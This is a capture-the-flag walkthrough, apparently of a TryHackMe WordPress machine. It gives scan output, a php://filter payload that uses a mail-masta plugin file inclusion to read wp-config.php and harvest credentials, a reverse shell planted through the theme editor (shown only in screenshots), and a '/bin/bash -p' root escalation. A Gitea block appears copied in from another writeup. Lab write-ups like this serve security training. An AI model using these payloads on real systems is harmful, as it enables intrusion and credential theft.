# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |


```
PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
| STAT:
| FTP server status:
| Connected to ::ffff:10.6.34.159
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 2
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
| 256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Ww9ui4NQDHA5l+lumRpLsAXHYNk4lkghej9obWBlOwnV+tIDw4mgmuO1C3U/WXRgn0GrESAnMpi1DSxy8t1k=
| 256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/
80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_ Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
The application running on the web server on port 3000 is the software development platform Gitea, recognizable by the set cookie `i_like_gitea`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FefVGb1ZXLw4R9GYPR7E4%252Fimage.png%3Falt%3Dmedia%26token%3Dbf2153c1-05be-461f-9ef7-cdc31a95d044&width=768&dpr=4&quality=100&sign=6b09f8dc&sv=2)
```

# RECONNAISSANCE
---

We can see that anonymous login is enabled based on the scan, let's check out FTP:

![Pasted image 20250321140200.png](../../IMAGES/Pasted%20image%2020250321140200.png)

```
https://app.gitbook.com/o/feSq9JQzvxpliZ5g7Cfk/s/rVz5yi8Ry9XpyVCpxpIT/~/changes/10/cybersecurity/ctf/tryhackme/all-in-one

```

Nothing in here, let's proceed to the website then:

![Pasted image 20250321140441.png](../../IMAGES/Pasted%20image%2020250321140441.png)

Simple apache2 page, let's fuzz:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.171.205/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.171.205/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wordpress [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 162ms]
hackathons [Status: 200, Size: 197, Words: 19, Lines: 64, Duration: 176ms]
```

We found `wordpress` and `hackathons`, let's check the last one:

![Pasted image 20250321141557.png](../../IMAGES/Pasted%20image%2020250321141557.png)

We can check the source code:

![Pasted image 20250321141616.png](../../IMAGES/Pasted%20image%2020250321141616.png)

This is talking about vigenere encoding, it's providing the key and the hash so let's decode:

![Pasted image 20250321155707.png](../../IMAGES/Pasted%20image%2020250321155707.png)

Looks like a password:

```
Try H@ckme@123
```

Let's save this for now, let's check the WordPress one:



![Pasted image 20250321141902.png](../../IMAGES/Pasted%20image%2020250321141902.png)

We can enumerate some basic stuff with wpscan:


```
wpscan --url "http://10.10.171.205/wordpress" --enumerate ap -t 50
_______________________________________________________________
 __ _______ _____
 \ \ / / __ \ / ____|
 \ \ /\ / /| |__) | (___ ___ __ _ _ __ ®
 \ \/ \/ / | ___/ \___ \ / __|/ _` | '_ \
 \ /\ / | | ____) | (__| (_| | | | |
 \/ \/ |_| |_____/ \___|\__,_|_| |_|

 WordPress Security Scanner by the WPScan Team
 Version 3.8.27
 Sponsored by Automattic - https://automattic.com/
 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.171.205/wordpress/ [10.10.171.205]
[+] Started: Fri Mar 21 21:53:55 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.171.205/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 | - http://codex.wordpress.org/XML-RPC_Pingback_API
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.171.205/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.171.205/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.171.205/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 | - https://www.iplocation.net/defend-wordpress-from-ddos
 | - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 | - http://10.10.171.205/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 | - http://10.10.171.205/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.171.205/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://10.10.171.205/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.171.205/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 | - http://10.10.171.205/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.171.205/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://10.10.171.205/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.171.205/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://10.10.171.205/wordpress/wp-content/plugins/reflex-gallery/readme.txtz
```

As seen, we got the `mail_masta` plugin enabled, this plugin is well known to be susceptible to LFI at version 1.0, we can try a PoC and test:

![Pasted image 20250321150756.png](../../IMAGES/Pasted%20image%2020250321150756.png)


# EXPLOITATION
---

Since we have LFI, and the password we found does not work for the user `elyana`, let's try to read `wp-config.php` file, if we do it normally:

![Pasted image 20250321160057.png](../../IMAGES/Pasted%20image%2020250321160057.png)

We get an internal server error, for this, let's use a `php wrapper` in the following way:

```
php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```


![Pasted image 20250321160230.png](../../IMAGES/Pasted%20image%2020250321160230.png)

And now we get the contents of the file in the format of base64, let's decode it and analyze it:


![Pasted image 20250321160332.png](../../IMAGES/Pasted%20image%2020250321160332.png)

There we go, we got the credentials:

```
elyana:H@ckme@123
```


Let's log into the panel:


![Pasted image 20250321161038.png](../../IMAGES/Pasted%20image%2020250321161038.png)


From this point, we can get a shell by exploiting the theme editor, let's do it:


![Pasted image 20250321161252.png](../../IMAGES/Pasted%20image%2020250321161252.png)



Let's change the contents of it to a reverse shell:

![Pasted image 20250321161313.png](../../IMAGES/Pasted%20image%2020250321161313.png)

Update, start a listener and visit this url:

```
http://<target>/wordpress/wp-content/themes/twentyseventeen/404.php
```

![Pasted image 20250321161556.png](../../IMAGES/Pasted%20image%2020250321161556.png)

And we got a shell, let's proceed with privesc.





# PRIVILEGE ESCALATION
---


First step is stabilizing our session:

1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. /usr/bin/script -qc /bin/bash /dev/null
3. CTRL + Z
4. stty raw -echo; fg
5. reset xterm
6. export TERM=xterm
7. export BASH=bash

![Pasted image 20250321161700.png](../../IMAGES/Pasted%20image%2020250321161700.png)

Once we've established our shell, let's look around for a way to get into root:

![Pasted image 20250321161942.png](../../IMAGES/Pasted%20image%2020250321161942.png)

As seen root is running a script.sh file in the crontab, we cannot write it with `www-data` so, we need either the credentials of `elyana` or look around for other stuff, let's use linpeas:

![Pasted image 20250321162922.png](../../IMAGES/Pasted%20image%2020250321162922.png)

We got a lot of binaries enabled, we can use this to get a root shell:

```
/bin/bash -p
```

![Pasted image 20250321163046.png](../../IMAGES/Pasted%20image%2020250321163046.png)

We got a root shell by this, let's read both flags:

```
bash-4.4# cat /home/elyana/user.txt
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

This is encoded using base64, let's decode:

```
echo 'VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259' | base64 -d
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

Let's read root:

```
bash-4.4# cat root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
```

Same as user:

```
echo 'VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9' | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

![Pasted image 20250321163201.png](../../IMAGES/Pasted%20image%2020250321163201.png)


sudo apt update && sudo apt full-upgrade -y
